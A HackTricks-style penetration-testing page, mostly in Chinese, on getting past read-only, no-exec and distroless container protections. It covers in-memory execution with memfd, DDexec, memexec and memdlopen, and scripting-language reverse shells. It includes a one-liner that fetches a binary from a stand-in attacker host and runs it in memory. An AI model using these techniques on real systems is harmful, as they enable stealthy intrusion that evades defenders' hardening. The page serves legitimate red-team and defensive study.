# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## 视频

在下面的视频中，你可以找到本页提到的技术的更深入讲解：

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec 场景

现在越来越常见在容器中遇到以 **read-only (ro) file system protection** 挂载的 linux 机器。这是因为运行一个 ro 文件系统的容器只需在 `securitycontext` 中设置 **`readOnlyRootFilesystem: true`** 就可以：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

然而，即使文件系统以 ro 挂载，**`/dev/shm`** 仍然是可写的，所以并不是完全不能在磁盘上写入。然而，该文件夹通常会以 **no-exec protection** 挂载，因此如果你把一个 binary 下载到这里，你 **将无法执行它**。

> [!WARNING]
> 从 red team 的角度来看，这使得下载并执行系统中不存在的 binaries（例如 backdoors 或枚举工具如 `kubectl`）变得更加复杂。

## Easiest bypass: Scripts

请注意我提到的是 binaries，你可以 **执行任何 script**，只要对应的解释器在机器上存在，例如如果系统有 `sh` 就可以运行 **shell script**，如果安装了 `python` 就可以运行 **python script**。

然而，这并不足以直接执行你的 binary backdoor 或其他你可能需要运行的 binary 工具。

## Memory Bypasses

如果你想执行一个 binary，但文件系统不允许，最好的方法是通过 **从内存执行它**，因为这些保护 **不适用于内存**。

### FD + exec syscall bypass

如果机器上有一些强大的脚本引擎，比如 **Python**, **Perl**, 或 **Ruby**，你可以把要执行的 binary 下载到内存，存储到一个内存文件描述符（`create_memfd` syscall），这个不会受这些保护的限制，然后调用 **`exec` syscall**，将该 **fd 指定为要执行的文件**。

为此你可以很方便地使用项目 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)。你可以把一个 binary 传给它，它会生成一个指定语言的脚本，该脚本包含 **binary 的压缩并 b64 编码** 的内容，以及在调用 `create_memfd` syscall 创建的 **fd** 中 **解码并解压** 的指令，并调用 **exec** syscall 来运行它。

> [!WARNING]
> 这在像 PHP 或 Node 这样的其他脚本语言中无法工作，因为它们默认没有从脚本中调用原始 syscalls 的方式，所以无法调用 `create_memfd` 来创建存放 binary 的 **memory fd**。
>
> 此外，在 `/dev/shm` 中创建一个包含文件的 **regular fd** 也不起作用，因为你将不能运行它，**no-exec protection** 会生效。

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) 是一种允许你通过重写进程的 **`/proc/self/mem`** 来 **修改你自己进程的内存** 的技术。

因此，通过 **控制正在被进程执行的汇编代码**，你可以编写一个 **shellcode** 并“变异”进程以 **执行任意代码**。

> [!TIP]
> **DDexec / EverythingExec** 将允许你从 **memory** 加载并 **execute** 你自己的 **shellcode** 或 **任何 binary**。
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.

You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.

## Distroless Bypass

For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.

The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.

### Reverse Shell

In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.

> [!WARNING]
> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.

However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.

> [!TIP]
> Using the scripting language you could **enumerate the system** using the language capabilities.

If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.

> [!TIP]
> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.

You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
